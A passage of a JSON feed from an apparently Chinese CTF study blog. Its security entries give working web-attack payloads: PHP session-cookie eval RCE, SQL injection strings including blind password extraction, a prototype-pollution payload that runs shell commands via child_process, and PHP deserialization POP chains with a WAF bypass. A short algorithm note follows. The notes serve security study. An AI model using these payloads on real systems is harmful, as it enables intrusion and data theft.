punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>修改Cookie <span class=\"token punctuation\">:</span> <span class=\"token constant\">PHPSESSID</span><span class=\"token operator\">=</span> filename 或 <span class=\"token operator\">/</span>flag</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token function\">hex2bin</span><span class=\"token punctuation\">(</span><span class=\"token function\">session_id</span><span class=\"token punctuation\">(</span><span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>抓包传入Cookie<span class=\"token punctuation\">:</span> <span class=\"token constant\">PHPSESSID</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"system('命令')\"</span>的十六进制<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>当前目录：<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token function\">array_rand</span><span class=\"token punctuation\">(</span><span class=\"token function\">array_flip</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">getcwd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>上级目录文件：<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token function\">array_rand</span><span class=\"token punctuation\">(</span><span class=\"token function\">array_flip</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">dirname</span><span class=\"token punctuation\">(</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token function\">dirname</span><span class=\"token punctuation\">(</span><span class=\"token function\">getcwd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h1 id=\"references\"><a class=\"anchor\" href=\"#references\">#</a> References</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTIyNDI/dGltZV9fMTMxMT1tcW1oRDVZSU1EN0drRGxjJTJCRUhmeGZnekRubTVLU2VEJmFtcDthbGljaGxncmVmPWh0dHBzJTNBJTJGJTJGeHouYWxpeXVuLmNvbSUyRnQlMkYxMjQzMSUzRnRpbWVfXzEzMTElM0RtcW1oRDVBS0RJeEl4Q3FHWHBlZXFuVWJEa0dxRDh0Q0R4UEQlMjZhbGljaGxncmVmJTNEaHR0cHMlMjUzQSUyNTJGJTI1MkY=\">利用 shell 脚本变量构造无字母数字命令</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvOTM2MD90aW1lX18xMzExPW40JTJCeHVEZ0Q5RHlpR1FZRFFORHNSMzJveGNEMG9oQXFXRCZhbXA7YWxpY2hsZ3JlZj1odHRwcyUzQSUyRiUyRmxpbmsuY3Nkbi5uZXQlMkYlM0Z0YXJnZXQlM0RodHRwcyUyNTNBJTI1MkYlMjUyRnh6LmFsaXl1bi5jb20lMjUyRnQlMjUyRjkzNjA=\">PHP 无参数 RCE</span></p>\n",
            "tags": [
                "Web",
                "RCE"
            ]
        },
        {
            "id": "http://yoursite.com/Web/SQL%E6%B3%A8%E5%85%A5/",
            "url": "http://yoursite.com/Web/SQL%E6%B3%A8%E5%85%A5/",
            "title": "SQL注入漏洞",
            "date_published": "2024-03-26T15:29:08.000Z",
            "content_html": "<hr />\n<hr />\n<h1 id=\"常用编码\"><a class=\"anchor\" href=\"#常用编码\">#</a> 常用编码</h1>\n<p>URL 编码：%27 单引号，%20 空格</p>\n<h1 id=\"注入点\"><a class=\"anchor\" href=\"#注入点\">#</a> 注入点</h1>\n<ul>\n<li>GET 型：URL 参数</li>\n<li>POST 型：和数据库有交互的登录框 / 查询框，burp 发包</li>\n<li>HTTP Request Head：Cookie，UA 头</li>\n</ul>\n<h1 id=\"整体思路\"><a class=\"anchor\" href=\"#整体思路\">#</a> 整体思路</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1.</span> 先加一个'看回显</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">2.</span> 数据包参数?xxx<span class=\"token operator\">=</span>aaa——后面加<span class=\"token string\">'and 1=1--+和'</span><span class=\"token keyword\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>或者<span class=\"token string\">'and '</span><span class=\"token number\">1</span><span class=\"token string\">'='</span><span class=\"token number\">1</span>和<span class=\"token string\">' and '</span><span class=\"token number\">1</span><span class=\"token string\">'='</span><span class=\"token number\">2</span>判断是否存在sql注入</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">3.</span> order by x<span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>判断列数</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">4.</span> <span class=\"token string\">'union select '</span>null<span class=\"token string\">','</span>null'<span class=\"token punctuation\">,</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>，要判别每一个（可能存在多种数据类型混合出现的情况）数据类型是数字型还是字符型——看有无回显判断是否成功注入，盲测可注入列数</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token number\">5.</span> null位置替换成关键字进行查询（不同数据库方式不一样）<span class=\"token punctuation\">[</span>SQL injection cheat sheet <span class=\"token operator\">|</span> Web Security Academy<span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span>https<span class=\"token punctuation\">:</span><span class=\"token operator\">//</span>portswigger<span class=\"token punctuation\">.</span>net<span class=\"token operator\">/</span>web<span class=\"token operator\">-</span>security<span class=\"token operator\">/</span>sql<span class=\"token operator\">-</span>injection<span class=\"token operator\">/</span>cheat<span class=\"token operator\">-</span>sheet<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   <span class=\"token number\">1.</span>  用函数如version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>时，不能用引号</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>   <span class=\"token number\">2.</span>  一个回显位回显多个username<span class=\"token operator\">|</span><span class=\"token operator\">|</span><span class=\"token string\">' '</span><span class=\"token operator\">|</span><span class=\"token operator\">|</span>password</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token number\">6.</span> 盲注Cookie<span class=\"token punctuation\">:</span> TrackingId<span class=\"token operator\">=</span>d2MRTvPQMnkzzv3q<span class=\"token string\">' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='</span>administrato<span class=\"token string\">r')='</span>§a§'<span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>   <span class=\"token number\">1.</span>  集束炸弹遍历爆破</pre></td></tr></table></figure><h1 id=\"mysql注入\"><a class=\"anchor\" href=\"#mysql注入\">#</a> MYSQL 注入</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?a<span class=\"token operator\">=</span><span class=\"token number\">1</span>'<span class=\"token keyword\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span>不用<span class=\"token keyword\">or</span>：参数<span class=\"token number\">1</span>存在，若用<span class=\"token keyword\">or</span>则布尔值恒真，需要用<span class=\"token keyword\">and</span>来带出变化<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>?a<span class=\"token operator\">=</span><span class=\"token number\">1</span>'<span class=\"token keyword\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>?a<span class=\"token operator\">=</span><span class=\"token number\">1</span>'order by <span class=\"token number\">3</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span> 经过测试这里的列是<span class=\"token number\">3</span>，<span class=\"token number\">4</span>就会报错说明没这么多</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>看回显位?a<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span>'union select <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>?a<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span>'union select <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>database<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span>  <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span>tables where table_schema<span class=\"token operator\">=</span><span class=\"token string\">\"test_db\"</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr></table></figure><h1 id=\"盲注payload\"><a class=\"anchor\" href=\"#盲注payload\">#</a> 盲注 payload</h1>\n<p>爆破通过回显来说明是否存在</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>版本<span class=\"token string\">'and substring(@@version,1,1)=1='</span><span class=\"token number\">1</span><span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>表名<span class=\"token string\">'AND (select 1 from \"******\" limit 0,1)=1+--'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>列名<span class=\"token string\">'AND (select substring(concat(1,user),1,1) from app_user limit 0,1)=1+--'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>字段值<span class=\"token string\">'AND ascii(substr((select password from app_user where id=xxx limit 1 offset 0),1,1))=101+--'</span></pre></td></tr></table></figure><h1 id=\"时间盲注\"><a class=\"anchor\" href=\"#时间盲注\">#</a> 时间盲注</h1>\n<p><code>(select(0)from(select(sleep(10)))v)</code></p>\n<p>执行延迟 10s，v 被用作临时表的别名，为了语法的完整性，需要为其创建一个临时表并指定一个别名。</p>\n",
            "tags": [
                "Web",
                "SQL注入"
            ]
        },
        {
            "id": "http://yoursite.com/Web/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/",
            "url": "http://yoursite.com/Web/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/",
            "title": "原型链污染",
            "date_published": "2024-03-26T15:29:08.000Z",
            "content_html": "<hr />\n<h1 id=\"javascript\"><a class=\"anchor\" href=\"#javascript\">#</a> Javascript</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vamF2YXNjcmlwdC1wcm90b3R5cGUtcG9sbHV0aW9uLWF0dGFjay5odG1sIzB4MDEtcHJvdG90eXBlX19wcm90bw==\">深入理解 JavaScript Prototype 污染攻击</span>__</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZXNjYXBlLXcvcC8xMjM0NzcwNS5odG1s\">初探 JavaScript 原型链污染</span></p>\n<p><code>Javascript</code>  基于原型实现继承，本身无 class 实现（ <code>ES2015/ES6</code>  中引入了 class 关键字，语法糖）</p>\n<p>每个实例对象都有一个私有属性 <code>__proto__</code> 指向它的构造函数的原型 <code>prototype</code></p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>foo<span class=\"token punctuation\">.</span>__proto__ <span class=\"token operator\">==</span> <span class=\"token class-name\">Foo</span><span class=\"token punctuation\">.</span>prototype</pre></td></tr></table></figure><p>如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong></p>\n<p><img data-src=\"/assets/Web/proto.jpg\" alt=\"\" /></p>\n<p>调用 test1.b，JavaScript 引擎会在对象 test1 中寻找 b，找不到，不断在 test1. <code>__proto__.__proto__.__proto__...</code>  中寻找 b，直到 <code>null</code>  结束， <code>Object.prototype</code>  的__proto__就是 null</p>\n<ul>\n<li>很多库最常见的控制键名的操作，也最能被原型链攻击，<strong>对象 merge</strong> 和<strong>对象 clone</strong></li>\n<li><code>JSON.parse('&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;')</code> ，传参需要 <code>json</code>  格式才可以解析 <code>__proto__</code> 为 “键名 key”，而不代表 “原型”</li>\n</ul>\n<p><strong>payload</strong></p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">&#123;</span><span class=\"token string-property property\">\"__proto__\"</span><span class=\"token operator\">:</span><span class=\"token punctuation\">&#123;</span><span class=\"token string-property property\">\"sourceURL\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"\\nreturn e=> &#123;for (var a in &#123;&#125;) &#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load('child_process').execSync('id')&#125;\\n//\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h1 id=\"python\"><a class=\"anchor\" href=\"#python\">#</a> Python</h1>\n<p>与 JavaScript 类似，该攻击可以中实现对 <code>Python</code> <strong> 类属性值</strong>的污染，同时还能做到对<strong>全局变量中的属性</strong>实现污染</p>\n",
            "tags": [
                "Web",
                "原型链污染"
            ]
        },
        {
            "id": "http://yoursite.com/Web/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/",
            "url": "http://yoursite.com/Web/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/",
            "title": "反序列化漏洞",
            "date_published": "2024-03-26T15:29:08.000Z",
            "content_html": "<hr />\n<h1 id=\"php\"><a class=\"anchor\" href=\"#php\">#</a> PHP</h1>\n<p>历史版本下载 https://museum.php.net/</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vU2F5by0vcC8xNjA0MTYwMC5odG1s\">https://www.cnblogs.com/Sayo-/p/16041600.html</span></p>\n<h2 id=\"pop链利用\"><a class=\"anchor\" href=\"#pop链利用\">#</a> POP 链利用</h2>\n<p>找到头和尾，也就是用户能传入参数的地方（头）和最终要执行函数方法的地方（尾），之后反推，根据每个魔术方法的特性，从尾部（ <code>如getFlag()</code> ）向上判断每步的跳转位置，直到找到传参处，最后再按照正序编写整个 POP 链的对象构造过程</p>\n<p><strong>传入的数据类型多为字符串或者数组</strong></p>\n<ul>\n<li>数组形式设置 <code>$c=array($t,0);var_dump( serialize($c));</code> ，</li>\n<li>若使用 %00 进行正则绕过，需要用 <code>var_dump(urldecode(serialize($flag)));</code>  对 %00 进行 URL 编码，使得浏览器成功解析</li>\n</ul>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token comment\">// 创建对象时触发，反序列化不触发</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 对象被销毁时触发</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token comment\">// 使用 unserialize 时触发</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">__sleep</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 使用 serialize 时触发</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 在对象上下文中调用不可访问的方法时触发</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">__callStatic</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 在静态上下文中调用不可访问的方法时触发</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 用于从不可访问的属性读取数据</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">__set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 用于将数据写入不可访问的属性</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token function\">__isset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 在不可访问的属性上调用 isset () 或 empty () 触发</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token function\">__unset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 在不可访问的属性上使用 unset () 时触发</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 当脚本尝试将对象调用为函数时触发</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 把类当作字符串使用时触发</span></pre></td></tr></table></figure><p>绕过原文件设置的 <strong>WAF（ <code>例如throw new Exception()</code> ）</strong>：<strong>fast destruct</strong> 提前触发魔术方法，，本质是 <code>unserialize</code>  过程中扫描器发现序列化字符串格式有误从而导致提前异常退出，为了销毁之前建立的对象内存空间，会立刻调用对象的 <code>__destruct()</code> ，提前触发反序列化链条。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#修改序列化数字元素个数</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>a<span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">7</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"myclass\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"a\"</span><span class=\"token punctuation\">;</span><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Hello\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"qwb\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"/flag\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#去掉序列化尾部 &#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>a<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">7</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"myclass\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"a\"</span><span class=\"token punctuation\">;</span><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Hello\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"qwb\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"/flag\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"payload举例\"><a class=\"anchor\" href=\"#payload举例\">#</a> payload 举例</h2>\n<p>（2023 陕西省大学生网安大赛）</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">night</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$night</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">day</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$day</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">dark</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$dark</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">light</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$light</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$t</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">night</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$t</span><span class=\"token operator\">-></span><span class=\"token property\">night</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">day</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token variable\">$t</span><span class=\"token operator\">-></span><span class=\"token property\">night</span><span class=\"token operator\">-></span><span class=\"token property\">day</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">dark</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$t</span><span class=\"token operator\">-></span><span class=\"token property\">night</span><span class=\"token operator\">-></span><span class=\"token property\">day</span><span class=\"token operator\">-></span><span class=\"token property\">dark</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">light</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$t</span><span class=\"token operator\">-></span><span class=\"token property\">night</span><span class=\"token operator\">-></span><span class=\"token property\">day</span><span class=\"token operator\">-></span><span class=\"token property\">dark</span><span class=\"token operator\">-></span><span class=\"token property\">light</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">day</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$t</span><span class=\"token operator\">-></span><span class=\"token property\">night</span><span class=\"token operator\">-></span><span class=\"token property\">day</span><span class=\"token operator\">-></span><span class=\"token property\">dark</span><span class=\"token operator\">-></span><span class=\"token property\">light</span><span class=\"token operator\">-></span><span class=\"token property\">day</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">dark</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$t</span><span class=\"token operator\">-></span><span class=\"token property\">night</span><span class=\"token operator\">-></span><span class=\"token property\">day</span><span class=\"token operator\">-></span><span class=\"token property\">dark</span><span class=\"token operator\">-></span><span class=\"token property\">light</span><span class=\"token operator\">-></span><span class=\"token property\">day</span><span class=\"token operator\">-></span><span class=\"token property\">dark</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"php://filter/read=convert.base64/resource=/flag\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure>",
            "tags": [
                "Web",
                "反序列化"
            ]
        },
        {
            "id": "http://yoursite.com/Algorithm/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/",
            "url": "http://yoursite.com/Algorithm/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/",
            "title": "动态规划",
            "date_published": "2024-03-22T15:29:08.000Z",
            "content_html": "<hr />\n<h2 id=\"动态规划\"><a class=\"anchor\" href=\"#动态规划\">#</a> 动态规划</h2>\n<h3 id=\"最长公共子串\"><a class=\"anchor\" href=\"#最长公共子串\">#</a> 最长公共子串</h3>\n<p>利用二维数组求解</p>\n<p>若 <code>s[ i ] == s[ j ]</code> ， <code>dp[ i ] [ j ] = dp[ i - 1 ] [ j - 1 ] + 1</code></p>\n<p>若 <code>s[ i ] != s[ j ]</code> ， <code>dp[ i ] [ j ] = 0</code></p>\n<h3 id=\"最长公共子序列\"><a class=\"anchor\" href=\"#最长公共子序列\">#</a> 最长公共子序列</h3>\n<p>若 <code>s[ i ] == s[ j ]</code> ， <code>dp[ i ] [ j ] = dp[ i - 1 ] [ j - 1 ] + 1</code></p>\n<p>若 <code>s[ i ] != s[ j ]</code> ， <code>dp[ i ] [ j ] = max（dp[ i - 1 ] [ j ]，dp[ i ] [ j - 1 ]）</code></p>\n",
            "tags": [
                "算法",
                "Algorithm"
            ]
        },
        {
            "id": "http://yoursite.com/Algorithm/%E8%B4%A8%E6%95%B0%E9%97%AE%E9%A2%98/",
